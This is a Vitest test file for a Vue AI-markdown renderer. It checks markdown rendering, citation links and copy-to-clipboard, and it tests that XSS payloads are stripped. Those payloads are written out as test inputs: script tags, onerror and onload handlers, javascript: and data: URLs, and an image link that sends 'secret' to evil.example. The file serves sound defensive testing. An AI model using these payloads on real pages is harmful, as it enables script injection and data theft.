import { describe, expect, it, vi } from 'vitest'
import { mount } from '@vue/test-utils'
import { renderAiMarkdown } from '@/adapters/browser/AiMarkdownRenderer'
import AiMarkdown from '@/platform/web/pages/doc/knowledge/AiMarkdown.vue'

function render(content: string, sources: Parameters<typeof renderAiMarkdown>[1] = []) {
  const root = document.createElement('div')
  root.innerHTML = renderAiMarkdown(content, sources)
  return root
}

describe('AI Markdown', () => {
  it('渲染标题、列表、表格、引用及代码并保留缩进', () => {
    const root = render('# 标题\n\n- 一\n- **二**\n\n> 引用\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n`inline`\n\n```python\nif True:\n    print("<safe>")\n```')
    expect(root.querySelector('h1')?.textContent).toBe('标题')
    expect(root.querySelectorAll('li')).toHaveLength(2)
    expect(root.querySelector('strong')?.textContent).toBe('二')
    expect(root.querySelector('blockquote')?.textContent).toContain('引用')
    expect(root.querySelectorAll('td')).toHaveLength(2)
    expect(root.querySelector('pre code')?.textContent).toBe('if True:\n    print("<safe>")')
    expect(root.querySelector('pre safe')).toBeNull()
  })

  it('HTML、事件属性、JS/data URL、嵌入内容与图片均不能执行或外传信息', () => {
    const attacks = [
      '<script>alert(1)</script><img src="https://evil.example/leak" onerror="alert(1)">',
      '<iframe src="https://evil.example"></iframe><svg onload="alert(1)"><a href="javascript:alert(1)">X</a></svg>',
      '[JS](javascript:alert%281%29) [entity](jav&#x61;script:alert%281%29) [data](data:text/html;base64,PHNjcmlwdD4=)',
      '[protocol](//evil.example) [backslash](/\\evil.example) ![私密图片](https://evil.example/exfil?text=secret)',
      '<style>body{background:url(https://evil.example)}</style><form><input autofocus onfocus="alert(1)"></form>',
      '```html\n<img src="https://evil.example" onerror="alert(1)">\n```',
    ]
    for (const attack of attacks) {
      const root = render(attack)
      expect(root.querySelector('script,img,iframe,svg,math,style,input,form')).toBeNull()
      expect(root.querySelector('[src],[style],[onerror],[onload],[onfocus]')).toBeNull()
      expect(Array.from(root.querySelectorAll('a'), a => a.getAttribute('href'))).not.toEqual(expect.arrayContaining([expect.stringMatching(/^(javascript:|data:|\/\/)/i)]))
    }
  })

  it('HTTPS外链独立标签且禁止opener，站内链接保持当前页面导航', () => {
    const root = render('[外链](https://example.com/docs) [站内](/java/test.html) [锚点](#hello)')
    const links = root.querySelectorAll('a')
    expect(links[0].target).toBe('_blank')
    expect(links[0].rel).toBe('noopener noreferrer')
    expect(links[1].getAttribute('href')).toBe('/java/test.html')
    expect(links[1].hasAttribute('target')).toBe(false)
    expect(links[2].getAttribute('href')).toBe('#hello')
  })

  it('只把已知来源变成可控引用，正文代码中的相同标记保持原样，历史来源URL再次验证', () => {
    const root = render('[D123S1] [D999S1] `code [D123S1]`\n\n```txt\n[D123S1]\n```\n\n[D124S1] [D125S1]', [
      { sourceId: 'D123S1', title: '可靠 <标题>', url: '/test.html?headingId=actual' },
      { sourceId: 'D124S1', title: '伪造JS', url: 'javascript:alert(1)' },
      { sourceId: 'D125S1', title: '伪造站外来源', url: 'https://evil.example/source' },
    ])
    expect(root.querySelectorAll('.ai-citation')).toHaveLength(1)
    expect(root.querySelector('.ai-citation')?.getAttribute('href')).toBe('/test.html?headingId=actual')
    expect(root.querySelector('.ai-citation')?.getAttribute('title')).toBe('可靠 <标题>')
    expect(root.textContent).toContain('[D999S1]')
    expect(root.querySelector('pre code')?.textContent).toBe('[D123S1]')
    expect(root.querySelector('p code')?.textContent).toBe('code [D123S1]')
  })

  it('流式未闭合 Markdown 安全降级，且独立于文档正文的 KaTeX/HTML renderer', () => {
    for (const partial of ['```html\n<script>alert(1)', '[link](java', '**未完成', '<img src="https://evil.example']) {
      expect(() => renderAiMarkdown(partial)).not.toThrow()
      expect(render(partial).querySelector('script,img')).toBeNull()
    }
    const root = render('$x$\n\n<div onclick="alert(1)">html</div>')
    expect(root.querySelector('.katex,[onclick]')).toBeNull()
    expect(root.textContent).toContain('$x$')
  })

  it('复制代码只复制原始代码文本，响应内容变化后重新渲染', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText } })
    const wrapper = mount(AiMarkdown, { props: { content: '```js\nif (a < b) {\n  run()\n}\n```' } })
    await wrapper.get('button[data-copy-code]').trigger('click')
    expect(writeText).toHaveBeenCalledWith('if (a < b) {\n  run()\n}')
    expect(wrapper.get('button').text()).toBe('已复制')
    await wrapper.setProps({ content: '**已更新**' })
    expect(wrapper.find('strong').text()).toBe('已更新')
    wrapper.unmount()
  })
})
